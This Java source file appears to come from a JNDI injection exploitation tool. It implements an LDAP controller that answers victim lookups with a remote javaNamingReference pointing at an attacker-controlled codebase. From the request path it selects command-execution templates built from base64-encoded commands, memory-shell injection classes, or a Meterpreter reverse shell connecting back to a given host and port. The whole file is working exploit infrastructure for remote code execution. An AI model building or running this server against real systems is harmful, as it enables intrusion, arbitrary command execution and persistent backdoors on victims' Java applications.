package com.qi4l.JYso.controllers;

import com.qi4l.JYso.enumtypes.GadgetType;
import com.qi4l.JYso.exceptions.IncorrectParamsException;
import com.qi4l.JYso.exceptions.UnSupportedPayloadTypeException;
import com.qi4l.JYso.gadgets.Config.Config;
import com.qi4l.JYso.gadgets.utils.Gadgets;
import com.qi4l.JYso.gadgets.utils.InjShell;
import com.qi4l.JYso.gadgets.utils.Util;
import com.qi4l.JYso.gadgets.utils.handle.ClassNameHandler;
import com.qi4l.JYso.template.CommandTemplate;
import com.qi4l.JYso.template.echoStatic.Meterpreter;
import com.unboundid.ldap.listener.interceptor.InMemoryInterceptedSearchResult;
import com.unboundid.ldap.sdk.Entry;
import com.unboundid.ldap.sdk.LDAPResult;
import com.unboundid.ldap.sdk.ResultCode;

import java.net.URL;
import java.nio.charset.StandardCharsets;
import java.util.Base64;
import java.util.Locale;

import static org.fusesource.jansi.Ansi.ansi;

@LdapMapping(uri = {"/basic"})
public class BasicController implements LdapController {

    private static String payloadType;
    // 用于对外提供动态字节码的 HTTP 服务器基础路径。
    private final String codebase = Config.codeBase;
    // 存放从 LDAP 路径中解析出的命令或连接参数。
    private String[] params = new String[0];
    private GadgetType gadgetType;

    // 向 LDAP 客户端返回引用指定 payload 类的搜索结果。
    @Override
    public void sendResult(InMemoryInterceptedSearchResult result, String base) throws Exception {
        try {
            Entry entry = new Entry(base);
            String className = resolvePayloadClass();
            URL targetUrl = new URL(new URL(codebase), className.replace('.', '/') + ".class");

            System.out.println(ansi().fgBrightBlue().a("  redirecting to " + targetUrl).reset());
            entry.addAttribute("javaClassName", "foo");
            entry.addAttribute("javaCodeBase", codebase);
            entry.addAttribute("objectClass", "javaNamingReference");
            entry.addAttribute("javaFactory", className);
            result.sendSearchEntry(entry);
            result.setResult(new LDAPResult(0, ResultCode.SUCCESS));
        } catch (Throwable er) {
            System.err.println("Error while generating or serializing payload");
            er.printStackTrace();
        }
    }

    // 解析请求路径，确定 payload 类型并准备执行时所需的参数。
    @Override
    public void process(String base) throws UnSupportedPayloadTypeException, IncorrectParamsException {
        System.out.println("- JNDI Remote Refenrence Links ");
        try {
            String normalized = base.replace('\\', '/');
            payloadType = segment(normalized, 1);
            if (payloadType.isEmpty()) {
                throw new UnSupportedPayloadTypeException("UnSupportedPayloadType : " + normalized);
            }
            System.out.println(ansi().fgBrightMagenta().a("  Paylaod: " + payloadType).reset());

            gadgetType = parseGadgetType(normalized);
            params = resolveParams(normalized);
        } catch (Exception e) {
            if (e instanceof UnSupportedPayloadTypeException) throw (UnSupportedPayloadTypeException) e;

            throw new IncorrectParamsException("Incorrect params >> " + base);
        }
    }

    // 根据 payload 标识返回需要加载的实现类名称。
    private String resolvePayloadClass() throws Exception {
        if (payloadType.contains("E-")) {
            Class<?> echoClass = Class.forName(ClassNameHandler.searchClassByName(suffixAfterDash(payloadType)));
            return echoClass.getName();
        }

        if (payloadType.contains("M-")) {
            InjShell.init(params);
            return Gadgets.createClassB(suffixAfterDash(payloadType));
        }

        if (payloadType.contains("command")) {
            if (params.length == 0) {
                throw new IncorrectParamsException("Missing command parameters.");
            }
            CommandTemplate commandTemplate = new CommandTemplate(params[0]);
            commandTemplate.cache();
            return commandTemplate.getClassName();
        }

        if (payloadType.contains("msf")) {
            return Meterpreter.class.getName();
        }

        throw new UnSupportedPayloadTypeException("Unsupported payload flag: " + payloadType);
    }

    // 读取路径中的 gadget 片段并转换为枚举值。
    private GadgetType parseGadgetType(String base) throws UnSupportedPayloadTypeException {
        String segment = segment(base, 2);
        if (segment.isEmpty()) {
            return null;
        }
        try {
            return GadgetType.valueOf(segment.toLowerCase(Locale.ROOT));
        } catch (IllegalArgumentException ignored) {
            throw new UnSupportedPayloadTypeException("UnSupportedPayloadType : " + segment);
        }
    }

    // 根据 gadget 类型构建命令行或回连配置参数。
    private String[] resolveParams(String base) throws Exception {
        if (gadgetType == null) {
            return new String[0];
        }

        switch (gadgetType) {
            case base64:
                String cmd = Util.getCmdFromBase(base);
                System.out.println(ansi().fgBrightRed().a("  Command: " + cmd).reset());
                return new String[]{cmd};
            case shell:
                String encoded = Util.getCmdFromBase(base);
                String decoded = new String(Base64.getDecoder().decode(encoded), StandardCharsets.UTF_8);
                System.out.println(ansi().fgBrightRed().a("  Command: " + decoded).reset());
                return decoded.split(" ");
            case msf:
                String[] results = Util.getIPAndPortFromBase(base);
                Config.rhost = results[0];
                Config.rport = results[1];
                System.out.println("  RemotHost: " + results[0]);
                System.out.println("  RemotPort: " + results[1]);
                return results;
            default:
                return new String[0];
        }
    }

    // 提取路径中第 index 个非空段，保持与原解析逻辑一致。
    private String segment(String base, int index) {
        int cursor = 0;
        int found = 0;
        while (cursor < base.length()) {
            int nextSlash = base.indexOf('/', cursor);
            if (nextSlash == -1) nextSlash = base.length();

            if (nextSlash > cursor) {
                if (found == index) {
                    return base.substring(cursor, nextSlash);
                }
                found++;
            }
            cursor = nextSlash + 1;
        }
        return "";
    }

    // 返回连字符后的子串，用于解析自定义类名。
    private String suffixAfterDash(String value) {
        int dashIndex = value.indexOf('-');
        return dashIndex >= 0 ? value.substring(dashIndex + 1) : value;
    }
}
